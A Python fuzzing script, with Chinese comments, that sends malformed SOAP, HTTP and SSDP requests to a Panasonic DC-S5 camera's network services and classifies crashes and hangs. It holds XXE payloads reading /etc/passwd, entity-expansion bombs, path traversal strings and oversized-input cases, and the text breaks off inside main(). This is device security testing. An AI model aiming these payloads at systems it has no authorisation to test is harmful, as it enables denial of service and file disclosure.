#!/usr/bin/env python3
"""
P0 黑盒 fuzz v2：DC-S5 网络解析面（dlna 60606 / 取图 50001 / SSDP 1900 / cam.cgi 80）。

★ v2 相对 v1 的修复与扩展（2026-10-16）：
  1. 【红线修复】移除 v1 的匿名 `req_acc` 状态查询（权威文档 §4-1 #4：匿名 req_acc 会留
     pending ⇒ err_others_requesting / invalid login）。授权状态只通过 dlna 403/200 判读。
  2. 【红线修复】req_acc 全程至多发一次（--rearm 时），绝不轮询重发；req_acc_can 仅 --cleanup
     时发一次（同一 UUID）。
  3. 【崩溃分类】单通道 8s 超时不再直接判崩溃。三通道健康（:80 cam.cgi / :60606 dlna /
     TCP 连通）× 计时，区分：
        crash     = :80 与 :60606 同时连接级死亡（整机重启/内核 panic）
        dlna_down = :80 活、:60606 死（dlna 进程崩溃，相机未重启 —— 同样高价值）
        hang      = 端口能连但 >15s 无 HTTP 响应（解析器挂起）
        alive     = 正常响应
  4. 【新策略】http（60606 HTTP 层：方法/路径/头/chunked/CL 不匹配/编码）、
     port50001（取图 HTTP 服务器路径面，仅热点模式开放）、ssdp（UDP 1900 畸形 M-SEARCH/NOTIFY）。
  5. 【日志】每个请求落 JSONL（fuzz_log_*.jsonl）：case 名 / 字节数 / 耗时 / 响应码 / 分类。
  6. 原有 7 组 XML/SOAP 策略保留（string/type/xml/xxe/attr/utf8/ext）。

用法：
  python3 -u fuzz_dlna.py <cam_ip> [--strategy all] [--count N]
  # 策略名：string|type|xml|xxe|attr|utf8|ext|http|port50001|ssdp|all
  # --rearm   若未授权（403），单发一次 req_acc 后继续（相机屏幕需点【允许】）
  # --cleanup 运行前用同一 UUID 发一次 req_acc_can 清陈旧 pending（仅在确认无其他客户端时用）

崩溃输入落盘 crash_cases/（文件名带分类前缀 c_=整机崩溃 d_=dlna进程崩溃 h_=挂起）。
安全：只发 HTTP/UDP 请求，不写 flash，不刷固件。相机崩溃 = 断电重启恢复。
"""
import sys
import socket
import time
import os
import re
import json
import random
import struct
import subprocess
import urllib.request
import urllib.parse

ACC_UUID = "4D454930-0100-1000-8001-020A0003BD13"   # 固定官方 UUID（全程唯一）
DEV_NAME = "LUMIX Sync"                              # 权威文档指定设备名
UA_CAM = {"User-Agent": "LUMIX Sync"}
UA_DLNA = "Panasonic MIL DLNA CP UPnP/1.0"

# 端口全部可由环境变量覆盖 —— 用途：接 mock_cam.py 在无相机时做全链路 dry-run。
DLNA_PORT = int(os.environ.get("S5_DLNA_PORT", "60606"))
IMG_PORT = int(os.environ.get("S5_IMG_PORT", "50001"))
SSDP_PORT = int(os.environ.get("S5_SSDP_PORT", "1900"))
CAM_HTTP_PORT = int(os.environ.get("S5_HTTP_PORT", "80"))

# ★ dlna 会话心跳（2026-10-16 14:52 实证：dlna 静默 ≈30s ⇒ 403 且 getstate 心跳救不回）
# 只在"非 dlna"用例族（http/port50001/ssdp/camcgi）之间补心跳，dlna 用例本身即心跳。
DLNA_HEARTBEAT_GAP = float(os.environ.get("S5_DLNA_GAP", "10"))
_last_dlna_touch = 0.0

CONTROL = "/Server0/CDS_control"
SERVICE = "urn:schemas-upnp-org:service:ContentDirectory:1"

TEMPLATE = (
    '<?xml version="1.0" encoding="utf-8"?>'
    '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
    's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    '<s:Body>'
    '<u:Browse xmlns:u="urn:schemas-upnp-org:service:ContentDirectory:1" '
    'xmlns:pana="urn:schemas-panasonic-com:pana">'
    '<ObjectID>{ObjectID}</ObjectID>'
    '<BrowseFlag>{BrowseFlag}</BrowseFlag>'
    '<Filter>{Filter}</Filter>'
    '<StartingIndex>{StartingIndex}</StartingIndex>'
    '<RequestedCount>{RequestedCount}</RequestedCount>'
    '<SortCriteria>{SortCriteria}</SortCriteria>'
    '<pana:X_FromCP>LumixLink2.0</pana:X_FromCP>'
    '</u:Browse></s:Body></s:Envelope>'
)

LOGFILE = None


def logline(d):
    if LOGFILE:
        d = dict(ts=time.time(), **d)
        with open(LOGFILE, "a") as f:
            f.write(json.dumps(d, ensure_ascii=False) + "\n")


def make_body(**kw):
    vals = dict(ObjectID="0", BrowseFlag="BrowseDirectChildren", Filter="*",
                StartingIndex="0", RequestedCount="0", SortCriteria="")
    vals.update(kw)
    return TEMPLATE.format(**vals)


# ---------------------------------------------------------------- 底层收发

def raw_http(cam, port, raw, timeout=8):
    """发原始 HTTP 请求（raw=bytes），返回 (err 或 None, status 或 None, resp_head, 耗时)。
    err 非空 = 连接级异常（CONNRESET/CONNREFUSED/TIMEOUT/OSError）。"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((cam, port))
        s.sendall(raw)
        resp = b""
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                return ("TIMEOUT", None, resp, time.time() - t0)
            if not chunk:
                break
            resp += chunk
            if len(resp) > 65536:
                break
        dt = time.time() - t0
        m = re.match(rb"HTTP/1\.[01] (\d{3})", resp)
        status = int(m.group(1)) if m else None
        return (None, status, resp[:256], dt)
    except ConnectionRefusedError:
        return ("CONNREFUSED", None, b"", time.time() - t0)
    except ConnectionResetError:
        return ("CONNRESET", None, b"", time.time() - t0)
    except socket.timeout:
        return ("TIMEOUT", None, b"", time.time() - t0)
    except OSError as e:
        return (f"OSError:{e}", None, b"", time.time() - t0)
    finally:
        try:
            s.close()
        except Exception:
            pass


def http_post(cam, body, timeout=8, port=DLNA_PORT, path=CONTROL,
              soap=True, extra_headers=""):
    """发 SOAP POST（保持 v1 接口），返回 (err, status)。"""
    if isinstance(body, str):
        body = body.encode("utf-8")
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {cam}:{port}\r\n"
        "Accept-Charset: UTF-8\r\n"
        'Content-Type: text/xml; charset="utf-8"\r\n'
        + (f'SOAPAction: "{SERVICE}#Browse"\r\n' if soap else "")
        + f"User-Agent: {UA_DLNA}\r\n"
        + extra_headers
        + f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body
    err, status, _, _ = raw_http(cam, port, req, timeout)
    return err, status


def cam_url(cam, query):
    """cam.cgi URL（尊重 S5_HTTP_PORT，便于 mock dry-run）。"""
    host = cam if CAM_HTTP_PORT == 80 else "%s:%d" % (cam, CAM_HTTP_PORT)
    return "http://%s/cam.cgi?%s" % (host, query)


def dlna_touch(cam, tag="heartbeat"):
    """★ dlna 会话保活（2026-10-16 14:52 实证：dlna 静默 ≈30s ⇒ 403 且不可恢复）。
    只在距上次 dlna 活动超过 DLNA_HEARTBEAT_GAP 秒时补一次 BrowseMetadata。
    返回 True=本次补发过。绝不发 accctrl，纯只读。"""
    global _last_dlna_touch
    now = time.time()
    if now - _last_dlna_touch < DLNA_HEARTBEAT_GAP:
        return False
    e, st = http_post(cam, make_body(BrowseFlag="BrowseMetadata"), timeout=8)
    _last_dlna_touch = time.time()
    logline(case="dlna_" + tag, kind="dl", err=e, status=st)
    if e or st == 403:
        print(f"    [hb] dlna 保活异常: err={e} status={st}（会话可能已掉，后续用例预计 403）")
    return True


def tcp_alive(cam, port, timeout=3):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((cam, port))
        return True
    except OSError:
        return False
    finally:
        try:
            s.close()
        except Exception:
            pass


def triad_health(cam, timeout=8):
    """三通道健康，返回 dict：cam80 / dlna60606 / img50001 各自 'ok'|'refused'|'reset'|'timeout'|'badstatus'。
    另附 dlna 授权态：'auth'（200/500）/'denied'（403）/None。"""
    out = {}
    host = cam if CAM_HTTP_PORT == 80 else "%s:%d" % (cam, CAM_HTTP_PORT)
    e, st, _, _ = raw_http(cam, CAM_HTTP_PORT,
                           b"GET /cam.cgi?mode=getstate HTTP/1.1\r\nHost: %s\r\n"
                           b"User-Agent: LUMIX Sync\r\nConnection: close\r\n\r\n" % host.encode(),
                           timeout=timeout)
    out["cam80"] = "ok" if st in (200,) else (f"st{st}" if st else e)
    e, st = http_post(cam, make_body(BrowseFlag="BrowseMetadata"), timeout=timeout)
    global _last_dlna_touch
    _last_dlna_touch = time.time()
    if e:
        out["dlna60606"] = e
        out["dlna_auth"] = None
    else:
        out["dlna60606"] = "ok"
        out["dlna_auth"] = "denied" if st == 403 else "auth"
    out["img50001"] = "open" if tcp_alive(cam, IMG_PORT, 3) else "closed"
    return out


# ---------------------------------------------------------------- 授权（红线）

def auth_status(cam):
    """只读判授权：dlna 200/500=已放行；403=未放行；连接异常=不可达。绝不发 accctrl。"""
    e, st = http_post(cam, make_body(BrowseFlag="BrowseMetadata"), timeout=8)
    if e:
        return "dead", e
    if st == 403:
        return "denied", 403
    return "ok", st


def do_rearm(cam, tries=12, delay=5.0):
    """单发一次 req_acc 然后只轮询 dlna 判据。绝不重发 req_acc，绝不发匿名 accctrl。"""
    print("[rearm] 单发 req_acc（唯一一次）—— 请在相机屏幕点【允许/是】...")
    try:
        urllib.request.urlopen(urllib.request.Request(
            cam_url(cam, urllib.parse.urlencode(
                {"mode": "accctrl", "type": "req_acc", "value": ACC_UUID, "value2": DEV_NAME})),
            headers=UA_CAM), timeout=8).read()
    except Exception as ex:
        print(f"[rearm] req_acc 发送失败: {ex}")
        return False
    for i in range(tries):
        time.sleep(delay)
        a, d = auth_status(cam)
        if a == "ok":
            print(f"[rearm] 授权 OK（dlna HTTP {d}）")
            return True
        if a == "dead":
            print(f"[rearm] 相机不可达（{d}），停止（不重发 req_acc）。请物理重启相机后重跑。")
            return False
        if i % 3 == 0:
            print(f"    [{i*delay}s] 仍 403 未授权...")
    print("[rearm] 超时仍 403。停止（不重发 req_acc）。请物理重启相机 → 重新进等待WiFi连接 → 重跑。")
    return False


def do_cleanup(cam):
    """--cleanup：同一 UUID 发一次 req_acc_can（清陈旧 pending）。仅在确认无其他客户端时。"""
    print("[cleanup] 单发 req_acc_can（同一 UUID，仅一次）...")
    try:
        urllib.request.urlopen(urllib.request.Request(
            cam_url(cam, urllib.parse.urlencode(
                {"mode": "accctrl", "type": "req_acc_can", "value": ACC_UUID, "value2": ""})),
            headers=UA_CAM), timeout=8).read()
    except Exception as ex:
        print(f"[cleanup] 失败: {ex}")
    time.sleep(2)


# ---------------------------------------------------------------- 崩溃处理

def on_connection_error(cam, name, err, body_bytes):
    """连接级异常后的受控分类。返回 'crash'/'dlna_down'/'hang'/'alive'/'skip'。"""
    time.sleep(3.0)
    h = triad_health(cam)
    cam80, dlna = h["cam80"], h["dlna60606"]

    if dlna == "ok":
        logline(case=name, note=f"transient {err} then alive", health=h)
        return "alive"

    if cam80 != "ok" and dlna not in ("ok",):
        # 80 也死了 → 整机重启/内核 panic 类
        tag = "crash"
        print(f"[!!!] {tag} 候选 #{name}: 原异常={err} 三通道={ {k:h[k] for k in ('cam80','dlna60606','img50001')} }")
        wait_for_full_recovery(cam, tag, name, body_bytes)
        return tag

    if dlna in ("CONNREFUSED", "CONNRESET"):
        # 80 活、60606 死 → dlna 进程崩
        tag = "dlna_down"
        print(f"[!!!] {tag} 候选 #{name}: dlna 进程疑似崩溃（cam80={cam80}, 原异常={err}）")
        save_crash(tag, name, body_bytes)
        print("      等待 dlna 端口恢复（watchdog 重启或相机重启，最多 120s）...")
        for _ in range(24):
            time.sleep(5)
            if tcp_alive(cam, DLNA_PORT, 3):
                print("      dlna 端口已恢复。")
                break
        return tag

    if dlna == "TIMEOUT":
        tag = "hang"
        print(f"[!!!] {tag} 候选 #{name}: 60606 可连但无响应（cam80={cam80}）")
        save_crash(tag, name, body_bytes)
        time.sleep(30)
        return tag

    # 其他（badstatus 等）：记录但不判崩溃
    logline(case=name, note=f"{err} health={h}", health=h)
    return "skip"


def save_crash(tag, name, body_bytes):
    os.makedirs("crash_cases", exist_ok=True)
    safe = re.sub(r"[^A-Za-z0-9_.-]", "_", name)[:80]
    fn = f"crash_cases/{tag}_{safe}.xml"
    with open(fn, "wb") as f:
        f.write(body_bytes if isinstance(body_bytes, bytes) else str(body_bytes).encode())
    print(f"      输入已存 {fn}")


def wait_for_full_recovery(cam, tag, name, body_bytes):
    save_crash(tag, name, body_bytes)
    print("      等待整机恢复（最多 180s）...")
    for _ in range(36):
        time.sleep(5)
        h = triad_health(cam)
        if h["cam80"] == "ok" and h["dlna60606"] == "ok":
            print("      整机已恢复。")
            return
    print("      180s 未恢复 —— 请物理断电重启相机，本会话中止。")
    sys.exit(3)


# ---------------------------------------------------------------- 变异策略

def mutate_string(cam):
    for n in [64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384]:
        s = "A" * n
        for field in ["ObjectID", "Filter", "SortCriteria", "BrowseFlag"]:
            yield (f"string_{field}_{n}", ("dl", make_body(**{field: s})))


def mutate_type(cam):
    for field in ["StartingIndex", "RequestedCount"]:
        for v in ["-1", "2147483647", "4294967295", "0x7fffffff", "1e9",
                  "99999999999999999999", "A" * 64, "%n%n%n%n", "0" * 64]:
            yield (f"type_{field}_{v[:12]}", ("dl", make_body(**{field: v})))


def mutate_xml(cam):
    cases = {
        "unclosed": make_body().replace("</u:Browse>", ""),
        "mismatch": make_body().replace("</u:Browse>", "</u:Wrong>"),
        "no_body_close": make_body().replace("</s:Body>", ""),
        "extra_close": make_body() + "</s:Body></s:Envelope></x></y>",
        "empty_elem": '<s:Envelope><s:Body><u:Browse/></s:Body></s:Envelope>',
        "deep": '<s:Envelope><s:Body><u:Browse>' + '<a>' * 200 + '</a>' * 200 + '</u:Browse></s:Body></s:Envelope>',
        "cdx_deep": '<s:Envelope><s:Body><u:Browse>' + '<a>' * 2000 + '</a>' * 2000 + '</u:Browse></s:Body></s:Envelope>',
    }
    for name, body in cases.items():
        yield (f"xml_{name}", ("dl", body))


def mutate_xxe(cam):
    cases = {
        "doctype_entity": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE a [<!ENTITY xxe "AAAA">]>'
            '<s:Envelope><s:Body><u:Browse>'
            '<ObjectID>&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;</ObjectID>'
            '</u:Browse></s:Body></s:Envelope>'),
        "billion_laughs": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
            '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]>'
            '<s:Envelope><s:Body><u:Browse><ObjectID>&lol4;</ObjectID></u:Browse></s:Body></s:Envelope>'),
        "external_entity": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<s:Envelope><s:Body><u:Browse><ObjectID>&xxe;</ObjectID></u:Browse></s:Body></s:Envelope>'),
    }
    for name, body in cases.items():
        yield (f"xxe_{name}", ("dl", body))


def mutate_attr(cam):
    cases = {
        "quote": make_body(ObjectID='"><script>alert(1)</script>'),
        "attr_inject": make_body().replace('<u:Browse ', '<u:Browse foo="bar" a="b" '),
        "xmlns_bomb": make_body().replace('<u:Browse ', '<u:Browse xmlns:a="A" xmlns:b="B" xmlns:c="C" '),
    }
    for name, body in cases.items():
        yield (f"attr_{name}", ("dl", body))


def mutate_utf8(cam):
    cases = {
        "overlong": make_body(ObjectID=b"\xc0\xaf".decode("latin1")),
        "surrogate": make_body(ObjectID=b"\xed\xa0\x80".decode("latin1")),
        "invalid": make_body(ObjectID=b"\xff\xfe\xfd".decode("latin1")),
    }
    for name, body in cases.items():
        yield (f"utf8_{name}", ("dl", body))


def mutate_ext(cam):
    for depth in (5000, 12000, 30000):
        yield (f"ext_deep{depth}",
               ("dl", '<s:Envelope><s:Body><u:Browse>' + '<a>' * depth + '</a>' * depth
                    + '</u:Browse></s:Body></s:Envelope>'))
    ents = '<!ENTITY a0 "aaaaaaaaaa">'
    for i in range(1, 9):
        ents += f'<!ENTITY a{i} "' + f'&a{i-1};' * 10 + '">'
    yield ("ext_expand1e8",
           ("dl", '<?xml version="1.0"?><!DOCTYPE d [' + ents + ']>'
                '<s:Envelope><s:Body><u:Browse><ObjectID>&a8;</ObjectID></u:Browse></s:Body></s:Envelope>'))
    yield ("ext_att_flood",
           ("dl", make_body().replace('<u:Browse ',
                                      '<u:Browse ' + ' '.join(f'a{i}="v{i}"' for i in range(2000)) + ' ')))
    tn = 'A' * 60000
    yield ("ext_tagname",
           ("dl", make_body().replace('<ObjectID>', f'<{tn}>').replace('</ObjectID>', f'</{tn}>')))
    yield ("ext_cdata", ("dl", make_body(ObjectID='<![CDATA[' + 'A' * 1000 + ']]>')))
    yield ("ext_comment", ("dl", make_body(ObjectID='<!--' + 'A' * 1000 + '-->')))
    yield ("ext_pi", ("dl", make_body(ObjectID='<?pi test?>')))
    yield ("ext_enc_utf16", ("dl", make_body().replace('encoding="utf-8"', 'encoding="UTF-16"')))
    yield ("ext_enc_iso", ("dl", make_body().replace('encoding="utf-8"', 'encoding="ISO-8859-1"')))
    yield ("ext_enc_long", ("dl", make_body().replace('encoding="utf-8"', 'encoding="' + 'A' * 10000 + '"')))
    for oid in ['..', '../../etc/passwd', '0/../0', '0' + chr(0), '%00', '0' * 1000,
                '../' * 200, '-1', '99999999']:
        yield (f"ext_oid_{repr(oid[:8])}", ("dl", make_body(ObjectID=oid)))
    yield ("ext_dup_objectid",
           ("dl", make_body().replace('<ObjectID>0</ObjectID>',
                                      '<ObjectID>0</ObjectID><ObjectID>0</ObjectID>')))
    yield ("ext_filter_wild", ("dl", make_body(Filter='*' * 5000)))
    yield ("ext_no_ns",
           ("dl", make_body().replace('xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"', '')))


# ---- v2 新增策略 ----

def _raw_case(name, method, path, port, body=b"", headers=None, raw_override=None, timeout=15):
    """构造一个 (case_name, payload_dict)。payload 直接走 raw_http，绕过 SOAP 模板。"""
    headers = headers or {}
    if raw_override is not None:
        return (name, ("raw", {"raw": raw_override, "port": port, "timeout": timeout}))
    hdrs = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
    body_b = body.encode() if isinstance(body, str) else body
    req = (f"{method} {path} HTTP/1.1\r\nHost: {port_placeholder}:{port}\r\n"
           f"User-Agent: {UA_DLNA}\r\n{hdrs}"
           f"Content-Length: {len(body_b)}\r\nConnection: close\r\n\r\n").encode() + body_b
    return (name, ("raw", {"raw": req, "port": port, "timeout": timeout}))


# raw 请求需要真 Host —— 用占位符替换（main 里填）
port_placeholder = "CAMIP"


def mutate_http(cam):
    """60606 HTTP 层（dlna 自带 HTTP 解析器，SOAP 之外的面）"""
    cases = []
    # 方法
    for m in ["GET", "HEAD", "PUT", "DELETE", "OPTIONS", "TRACE", "PATCH", "PROPFIND"]:
        cases.append(_h(f"http_{m}_cds", m, CONTROL))
    # 路径
    for p in ["/", "/Server0", "/Server0/", "/Server0/rootDesc.xml", "/Server1/CDS_control",
              "/Server0/CDS_control/extra", "//Server0//CDS_control",
              "/%53erver0/CDS_control", "/Server0/%43DS_control",
              "/Server0/CDS_control%00", "/..%2f..%2f..%2fetc%2fpasswd",
              "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p",
              "/" + "A" * 512, "/" + "A" * 4096, "/" + "A" * 65536,
              "/Server0/CDS_control ", "/ Server0/CDS_control",
              "/Server0/CDS_control%ff%fe", "/Server0/" + "A" * 300 + "/B"]:
        cases.append(_h(f"http_path_{p[:24]!r}", "GET", p))
    # 头
    cases.append(_h("http_hdr_long", "GET", CONTROL,
                    extra={"X-Pad": "A" * 8192}))
    cases.append(_h("http_hdr_huge", "GET", CONTROL,
                    extra={"X-Pad": "A" * 65536}))
    cases.append(_h("http_hdr_dup_ct", "GET", CONTROL,
                    extra={"Content-Type": "text/xml", "Content-Type2": "text/xml"}))
    cases.append(_h("http_hdr_expect100", "POST", CONTROL,
                    body=make_body(), extra={"Expect": "100-continue"}))
    # chunked（声明 chunked 但体是普通 XML）
    body = make_body().encode()
    chunked = b"".join(b"%x\r\n" % len(body[i:i+0x400]) + body[i:i+0x400]
                       for i in range(0, len(body), 0x400)) + b"0\r\n\r\n"
    req = (f"POST {CONTROL} HTTP/1.1\r\nHost: CAMIP:{DLNA_PORT}\r\n"
           f'Content-Type: text/xml; charset="utf-8"\r\n'
           f'SOAPAction: "{SERVICE}#Browse"\r\n'
           f"User-Agent: {UA_DLNA}\r\n"
           f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n").encode() + chunked
    cases.append(("http_chunked", ("raw", {"raw": req, "port": DLNA_PORT, "timeout": 15})))
    # Content-Length 不匹配（声明比实际多 100）
    req = (f"POST {CONTROL} HTTP/1.1\r\nHost: CAMIP:{DLNA_PORT}\r\n"
           f'Content-Type: text/xml; charset="utf-8"\r\n'
           f"User-Agent: {UA_DLNA}\r\n"
           f"Content-Length: {len(body) + 100}\r\nConnection: close\r\n\r\n").encode() + body
    cases.append(("http_cl_too_big", ("raw", {"raw": req, "port": DLNA_PORT, "timeout": 15})))
    # Content-Length 不匹配（声明比实际少 100）
    req = (f"POST {CONTROL} HTTP/1.1\r\nHost: CAMIP:{DLNA_PORT}\r\n"
           f'Content-Type: text/xml; charset="utf-8"\r\n'
           f"User-Agent: {UA_DLNA}\r\n"
           f"Content-Length: {max(0, len(body) - 100)}\r\nConnection: close\r\n\r\n").encode() + body
    cases.append(("http_cl_too_small", ("raw", {"raw": req, "port": DLNA_PORT, "timeout": 15})))
    # HTTP/1.0
    req = (f"GET {CONTROL} HTTP/1.0\r\nHost: CAMIP:{DLNA_PORT}\r\nUser-Agent: {UA_DLNA}\r\n\r\n").encode()
    cases.append(("http_10_get", ("raw", {"raw": req, "port": DLNA_PORT, "timeout": 15})))
    # 无 Host
    req = (f"GET {CONTROL} HTTP/1.1\r\nUser-Agent: {UA_DLNA}\r\nConnection: close\r\n\r\n").encode()
    cases.append(("http_no_host", ("raw", {"raw": req, "port": DLNA_PORT, "timeout": 15})))
    # 超长 Host
    cases.append(_h("http_host_huge", "GET", CONTROL, extra={"Host": "A" * 2048}))
    # 垃圾行
    cases.append(("http_garbage", ("raw", {"raw": b"NOT_HTTP\r\n\r\n", "port": DLNA_PORT, "timeout": 10})))
    cases.append(("http_empty", ("raw", {"raw": b"\r\n", "port": DLNA_PORT, "timeout": 10})))
    cases.append(("http_crlf_only", ("raw", {"raw": b"\r\n\r\n\r\n\r\n", "port": DLNA_PORT, "timeout": 10})))
    return cases


def _h(name, method, path, body=b"", extra=None):
    e = dict({"Accept-Charset": "UTF-8"})
    if extra:
        e.update(extra)
    body_b = body.encode() if isinstance(body, str) else body
    req = (f"{method} {path} HTTP/1.1\r\nHost: CAMIP:{DLNA_PORT}\r\n"
           f"User-Agent: {UA_DLNA}\r\n" + "".join(f"{k}: {v}\r\n" for k, v in e.items())
           + f"Content-Length: {len(body_b)}\r\nConnection: close\r\n\r\n").encode() + body_b
    return (name, ("raw", {"raw": req, "port": DLNA_PORT, "timeout": 15}))


def mutate_port50001(cam):
    """50001 取图 HTTP 服务器（仅热点开放）路径面"""
    cases = []
    for p in ["/", "/DO01000018.JPG", "/DM01000018.JPG", "/DT01000018.JPG",
              "/..%2f..%2f..%2fetc%2fpasswd", "/....//....//etc/passwd",
              "/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/..%252f..%252f..%252fetc/passwd",
              "/" + "A" * 256 + ".JPG", "/" + "A" * 4096 + ".JPG", "/" + "A" * 65536 + ".JPG",
              "/DO01000018.JPG?" + "x" * 4096, "/DO01000018.JPG#frag",
              "/%00", "/ A.JPG", "/A%00B.JPG", "/UPPER.JPG",
              "/DO01000018.JPG/extra"]:
        req = (f"GET {p} HTTP/1.1\r\nHost: CAMIP:{IMG_PORT}\r\n"
               f"User-Agent: {UA_DLNA}\r\nConnection: close\r\n\r\n").encode()
        cases.append((f"img_path_{p[:24]!r}", ("raw", {"raw": req, "port": IMG_PORT, "timeout": 10})))
    for m in ["POST", "PUT", "DELETE", "OPTIONS", "HEAD"]:
        req = (f"{m} / HTTP/1.1\r\nHost: CAMIP:{IMG_PORT}\r\n"
               f"User-Agent: {UA_DLNA}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n").encode()
        cases.append((f"img_{m}", ("raw", {"raw": req, "port": IMG_PORT, "timeout": 10})))
    return cases


def mutate_ssdp(cam):
    """SSDP 1900（UDP）畸形包"""
    cases = []
    base = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\n"
            "MX: 1\r\nST: upnp:rootdevice\r\n\r\n")
    cases.append(("ssdp_normal", ("udp", {"data": base.encode(), "dst": (None, SSDP_PORT), "timeout": 4})))
    cases.append(("ssdp_long_st", ("udp", {"data": ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
                                                    "MAN: \"ssdp:discover\"\r\nMX: 1\r\nST: " + "A" * 8192 + "\r\n\r\n").encode(),
                                          "dst": (None, SSDP_PORT), "timeout": 4})))
    cases.append(("ssdp_long_man", ("udp", {"data": ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
                                                     "MAN: \"" + "A" * 8192 + "\"\r\nMX: 1\r\nST: upnp:rootdevice\r\n\r\n").encode(),
                                          "dst": (None, SSDP_PORT), "timeout": 4})))
    cases.append(("ssdp_giant", ("udp", {"data": ("M-SEARCH * HTTP/1.1\r\n" + "A" * 60000 + "\r\n\r\n").encode(),
                                         "dst": (None, SSDP_PORT), "timeout": 4})))
    cases.append(("ssdp_no_st", ("udp", {"data": b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\n\r\n",
                                        "dst": (None, SSDP_PORT), "timeout": 4})))
    cases.append(("ssdp_notify", ("udp", {"data": ("NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
                                                   "NTS: ssdp:alive\r\nUSN: " + "A" * 4096 + "\r\n\r\n").encode(),
                                         "dst": (None, SSDP_PORT), "timeout": 4})))
    cases.append(("ssdp_neg_cseq", ("udp", {"data": b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nCSeq: -1\r\nST: upnp:rootdevice\r\n\r\n",
                                         "dst": (None, SSDP_PORT), "timeout": 4})))
    cases.append(("ssdp_empty", ("udp", {"data": b"\r\n", "dst": (None, SSDP_PORT), "timeout": 4})))
    return cases


def mutate_model(cam):
    """机型/客户端身份面（延迟导入 fuzz_model，避免循环依赖）。"""
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import fuzz_model
    return fuzz_model.mutate_model(cam)


_STRATEGY_NAMES = ("string", "type", "xml", "xxe", "attr", "utf8", "ext",
                   "http", "port50001", "ssdp", "model")
STRATEGIES = {
    "string": mutate_string,
    "type": mutate_type,
    "xml": mutate_xml,
    "xxe": mutate_xxe,
    "attr": mutate_attr,
    "utf8": mutate_utf8,
    "ext": mutate_ext,
    "http": mutate_http,
    "port50001": mutate_port50001,
    "ssdp": mutate_ssdp,
    "model": mutate_model,
}


def mutate_all(cam):
    for name in _STRATEGY_NAMES:
        for x in STRATEGIES[name](cam):
            yield x


STRATEGIES["all"] = mutate_all


# ---------------------------------------------------------------- 主循环

def send_one(cam, kind, payload):
    """发送单个用例，返回 (err, status, dt)。"""
    if kind == "dl":
        body = payload
        req = (f"POST {CONTROL} HTTP/1.1\r\nHost: {cam}:{DLNA_PORT}\r\n"
               "Accept-Charset: UTF-8\r\n"
               'Content-Type: text/xml; charset="utf-8"\r\n'
               f'SOAPAction: "{SERVICE}#Browse"\r\n'
               f"User-Agent: {UA_DLNA}\r\n"
               f"Content-Length: {len(body.encode())}\r\nConnection: close\r\n\r\n").encode() + body.encode()
        return raw_http(cam, DLNA_PORT, req, timeout=15)
    elif kind == "raw":
        raw = payload["raw"]
        if isinstance(raw, str):
            raw = raw.encode()
        raw = raw.replace(b"Host: CAMIP", b"Host: " + cam.encode()).replace(b"CAMIP:", cam.encode() + b":")
        return raw_http(cam, payload["port"], raw, timeout=payload.get("timeout", 15))
    elif kind == "camcgi":
        # cam.cgi GET（机型/身份面：UA 与 query 串都可由用例控制）
        q = payload["query"]
        ua = payload.get("ua", "LUMIX Sync")
        raw = ("GET /cam.cgi?%s HTTP/1.1\r\nHost: %s\r\n"
               "User-Agent: %s\r\nAccept-Charset: UTF-8\r\n"
               "Connection: close\r\n\r\n" % (q, cam, ua)).encode()
        return raw_http(cam, CAM_HTTP_PORT, raw, timeout=payload.get("timeout", 10))
    elif kind == "udp":
        data = payload["data"]
        _, dstport = payload["dst"]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(payload.get("timeout", 4))
        t0 = time.time()
        try:
            s.sendto(data, ("239.255.255.250", dstport))
            # SSDP 可能回 200 —— 收一下（不强制）
            try:
                s.recv(1024)
            except socket.timeout:
                pass
            return (None, None, 0, time.time() - t0)
        except OSError as e:
            return (f"OSError:{e}", None, 0, time.time() - t0)
        finally:
            try:
                s.close()
            except Exception:
                pass
    raise ValueError(kind)


def main():
    global LOGFILE
    if len(sys.argv) < 2:
        print("usage: python3 -u fuzz_dlna.py <cam_ip> [--strategy all] [--count N] [--rearm] [--cleanup]")
        sys.exit(1)
    cam = sys.argv[1]
    strategy = "all"
    count = 0
    rearm = False
    cleanup = False
    args = sys.argv[2:]
    i = 0
    while i < len(args):
        if args[i] == "--strategy":
            strategy = args[i + 1]; i += 2
